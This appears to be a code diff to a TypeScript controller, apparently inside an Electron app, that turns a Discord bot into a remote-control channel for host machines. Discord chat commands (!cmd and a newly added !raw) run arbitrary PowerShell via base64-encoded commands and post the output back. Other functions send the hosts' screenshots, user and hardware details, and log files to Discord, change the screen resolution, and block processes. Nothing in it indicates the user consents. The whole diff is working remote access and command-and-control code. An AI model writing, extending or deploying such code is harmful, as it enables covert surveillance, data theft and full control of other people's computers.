@@ -65,7 +65,17 @@ class MasterController {
           const target = parts[1]
           const command = parts.slice(2).join(' ')
           if (target === this.hostname) {
-            await this.runShell(command, message.channelId)
+            await this.runShell(command, message.channelId, true)
+          }
+        }
+      }
+      else if (lowContent.startsWith('!raw ')) {
+        const parts = content.split(' ')
+        if (parts.length >= 3) {
+          const target = parts[1]
+          const command = parts.slice(2).join(' ')
+          if (target === this.hostname) {
+            await this.runShell(command, message.channelId, false)
           }
         }
       }
@@ -113,7 +123,7 @@ class MasterController {
             await interaction.deleteReply().catch(()=>{})
           }
           else if (action === 'ping') {
-            await interaction.reply({ content: `🏓 Pong from **${this.hostname}**`, flags: ['Ephemeral'] })
+            await interaction.reply({ content: `🏓 Pong from **${this.hostname}**`, flags: [64] })
           }
           else if (action === 'list') {
             await interaction.update(this.getBlockListPayload())
@@ -147,13 +157,13 @@ class MasterController {
             await interaction.message.edit(this.getControlPanelPayload()).catch(()=>{})
           }
           else if (action === 'shell_ui') {
-            await interaction.reply({ content: `💻 **Shell [${this.hostname}]:**\nВ чат:\n\`!cmd ${this.hostname} dir\``, flags: ['Ephemeral'] })
+            await interaction.reply({ content: `💻 **Shell [${this.hostname}]:**\nВ чат:\n\`!cmd ${this.hostname} dir\`\nИли для вывода с мусором:\n\`!raw ${this.hostname} dir\``, flags: [64] })
           }
           else if (action === 'res_ui') {
-            await interaction.reply({ content: `🖥 **Разрешение [${this.hostname}]:**\nВ чат:\n\`!res ${this.hostname} 1920x1080\``, flags: ['Ephemeral'] })
+            await interaction.reply({ content: `🖥 **Разрешение [${this.hostname}]:**\nВ чат:\n\`!res ${this.hostname} 1920x1080\``, flags: [64] })
           }
           else if (action === 'block_ui') {
-            await interaction.reply({ content: `🚫 **Блокировка [${this.hostname}]:**\nВ чат:\n\`!block ${this.hostname} notepad.exe\``, flags: ['Ephemeral'] })
+            await interaction.reply({ content: `🚫 **Блокировка [${this.hostname}]:**\nВ чат:\n\`!block ${this.hostname} notepad.exe\``, flags: [64] })
           }
           else if (action === 'unblock' && val) {
             this.blockedProcesses.delete(val)
@@ -250,9 +260,7 @@ class MasterController {
 
   private getBlockListPayload() {
     const rows: ActionRowBuilder<ButtonBuilder>[] = []
-    
     let current_row = new ActionRowBuilder<ButtonBuilder>()
-    
     const processes = Array.from(this.blockedProcesses).slice(0, 20)
     for (const proc of processes) {
       if (current_row.components.length >= 5) {
@@ -267,20 +275,11 @@ class MasterController {
       )
     }
     if (current_row.components.length > 0) rows.push(current_row)
-
     const backRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`${this.hostname}:manage`)
-        .setLabel('Назад')
-        .setStyle(ButtonStyle.Secondary)
+      new ButtonBuilder().setCustomId(`${this.hostname}:manage`).setLabel('Назад').setStyle(ButtonStyle.Secondary)
     )
-    
     rows.push(backRow)
-
-    const content = this.blockedProcesses.size === 0 
-      ? `📝 **Блок-лист [${this.hostname}]:**\nПусто.` 
-      : `📝 **Блок-лист [${this.hostname}]:**\nНажмите для разблокировки:`
-
+    const content = this.blockedProcesses.size === 0 ? `📝 **Блок-лист [${this.hostname}]:**\nПусто.` : `📝 **Блок-лист [${this.hostname}]:**\nНажмите для разблокировки:`
     return { content, components: rows }
   }
 
@@ -304,54 +303,34 @@ class MasterController {
       `
       const base64Script = Buffer.from(psScript, 'utf16le').toString('base64')
       exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, (err, stdout) => {
-        if (err) {
-          resolve(this.getControlPanelPayload()) // Silently fail back to panel
-          return
-        }
+        if (err) { resolve(this.getControlPanelPayload()); return }
         const rows: ActionRowBuilder<ButtonBuilder>[] = []
         let current_row = new ActionRowBuilder<ButtonBuilder>()
-
         const parts = stdout.trim().split(';')
         parts.forEach(p => {
           if (!p) return
           const [idx, res, hz, primary, name] = p.split('|')
-          if (current_row.components.length >= 5) {
-             rows.push(current_row)
-             current_row = new ActionRowBuilder<ButtonBuilder>()
-          }
-          current_row.addComponents(
-             new ButtonBuilder()
-               .setCustomId(`${this.hostname}:do_shot:${idx}`)
-               .setLabel(`${primary === 'True' ? '⭐️ ' : ''}${name.slice(0,20)}`)
-               .setStyle(ButtonStyle.Primary)
-          )
+          if (current_row.components.length >= 5) { rows.push(current_row); current_row = new ActionRowBuilder<ButtonBuilder>() }
+          current_row.addComponents(new ButtonBuilder().setCustomId(`${this.hostname}:do_shot:${idx}`).setLabel(`${primary === 'True' ? '⭐️ ' : ''}${name.slice(0,20)}`).setStyle(ButtonStyle.Primary))
         })
         if (current_row.components.length > 0) rows.push(current_row)
-        
         rows.push(new ActionRowBuilder<ButtonBuilder>().addComponents(
           new ButtonBuilder().setCustomId(`${this.hostname}:do_shot:all`).setLabel('🖼 Все вместе').setStyle(ButtonStyle.Success),
           new ButtonBuilder().setCustomId(`${this.hostname}:manage`).setLabel('⬅️ Отмена').setStyle(ButtonStyle.Secondary)
         ))
-
         resolve({ content: `📸 **Выбор монитора [${this.hostname}]:**`, components: rows })
       })
     })
   }
 
-  // --- ACTIONS ---
-
   private async sendIdentityButton(channelId: string) {
     const channel = this.client.channels.cache.get(channelId)
-    if (channel && channel.isTextBased()) {
-      await channel.send(this.getIdentityPayload())
-    }
+    if (channel && channel.isTextBased()) await channel.send(this.getIdentityPayload())
   }
 
   private async reportFullSpecs(channelId: string) {
     const specs = await getSystemSpecs()
-    const embed = new EmbedBuilder()
-      .setColor(0x0099FF)
-      .setTitle(`🖥 Отчет: ${specs.hostname}`)
+    const embed = new EmbedBuilder().setColor(0x0099FF).setTitle(`🖥 Отчет: ${specs.hostname}`)
       .addFields(
         { name: '👤 User', value: `\`${specs.username}\``, inline: true },
         { name: '📀 OS', value: `\`${specs.platform}\``, inline: true },
@@ -359,25 +338,16 @@ class MasterController {
         { name: '⚙️ CPU', value: `\`${specs.cpu}\`` },
         { name: '📟 GPU', value: `\`${specs.gpu}\`` },
         { name: '📦 Disk', value: `\`${specs.disk}\`` }
-      )
-      .setTimestamp()
-
+      ).setTimestamp()
     const channel = this.client.channels.cache.get(channelId)
-    if (channel && channel.isTextBased()) {
-      await channel.send({ embeds: [embed] })
-    }
+    if (channel && channel.isTextBased()) await channel.send({ embeds: [embed] })
   }
 
   private async reportLogs(channelId: string) {
     const logPath = path.join(app.getPath('userData'), 'logs', 'app.log')
     const channel = this.client.channels.cache.get(channelId)
     if (!channel || !channel.isTextBased()) return
-
-    if (!existsSync(logPath)) {
-      await channel.send(`❌ Лог-файл не найден на **${this.hostname}**`)
-      return
-    }
-
+    if (!existsSync(logPath)) { await channel.send(`❌ Лог-файл не найден на **${this.hostname}**`); return }
     const attachment = new AttachmentBuilder(logPath, { name: `${this.hostname}_nexus.log` })
     await channel.send({ content: `📂 Логи с **${this.hostname}**:`, files: [attachment] })
   }
@@ -385,7 +355,6 @@ class MasterController {
   private async takeScreenshot(index: string, channelId: string) {
     const channel = this.client.channels.cache.get(channelId)
     if (!channel || !channel.isTextBased()) return
-
     const tempPath = path.join(app.getPath('temp'), `shot_${Date.now()}.png`)
     const isAll = index === 'all'
     const psScript = `
@@ -416,29 +385,19 @@ class MasterController {
     })
   }
 
-  private async runShell(command: string, channelId: string) {
+  private async runShell(command: string, channelId: string, clean: boolean = true) {
     const channel = this.client.channels.cache.get(channelId)
     if (!channel || !channel.isTextBased()) return
-
-    // Suppress progress bars ($ProgressPreference) and force UTF8 encoding
     const utf8Command = `[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; $ProgressPreference = 'SilentlyContinue'; ${command}`
     const base64Command = Buffer.from(utf8Command, 'utf16le').toString('base64')
-    
     exec(`powershell -NoProfile -EncodedCommand ${base64Command}`, async (err, stdout, stderr) => {
-      let output = stdout || stderr || (err ? err.message : 'Команда выполнена')
-      
-      // Remove CLIXML prefix if any remaining
-      output = output.replace(/#<\s*CLIXML[\s\S]+/, '').trim()
-
-      if (output.length <= 1900) {
-        await channel.send(`💻 **Shell [${this.hostname}]:**\n\`\`\`text\n${output}\n\`\`\``)
-      } else {
-        await channel.send(`💻 **Shell [${this.hostname}]:** (Output too long, splitting...)`)
-        // Split by 1900 chars
-        for (let i = 0; i < output.length; i += 1900) {
-          const chunk = output.slice(i, i + 1900)
-          await channel.send(`\`\`\`text\n${chunk}\n\`\`\``)
-        }
+      let output = stdout || stderr || (err ? err.message : 'Выполнено')
+      if (clean) output = output.replace(/#<\s*CORE_CLIXML[\s\S]+?<\/Objs>/g, '').replace(/#<\s*CLIXML[\s\S]+?<\/Objs>/g, '').trim()
+      const prefix = clean ? '💻 **Shell**' : '💻 **Raw Shell**'
+      if (output.length <= 1900) await channel.send(`${prefix} [${this.hostname}]:\n\`\`\`text\n${output}\n\`\`\``)
+      else {
+        await channel.send(`${prefix} [${this.hostname}]: (Output too long, splitting...)`)
+        for (let i = 0; i < output.length; i += 1900) await channel.send(`\`\`\`text\n${output.slice(i, i + 1900)}\n\`\`\``)
       }
     })
   }
@@ -446,7 +405,6 @@ class MasterController {
   private async setResolution(resStr: string, channelId: string) {
     const channel = this.client.channels.cache.get(channelId)
     if (!channel || !channel.isTextBased()) return
-
     const [w, h] = resStr.split('x')
     const psScript = `
       $w = ${w}; $h = ${h};
@@ -477,7 +435,7 @@ class MasterController {
     exec(`powershell -NoProfile -EncodedCommand ${base64Script}`, (err, stdout) => {
        const code = stdout.trim()
        if (code === '0') channel.send(`✅ **${this.hostname}**: Разрешение изменено на ${resStr}`)
-       else channel.send(`❌ **${this.hostname}**: Ошибка смены разрешения (Код ${code})`)
+       else channel.send(`❌ **${this.hostname}**: Ошибка (Код ${code})`)
     })
   }
 }
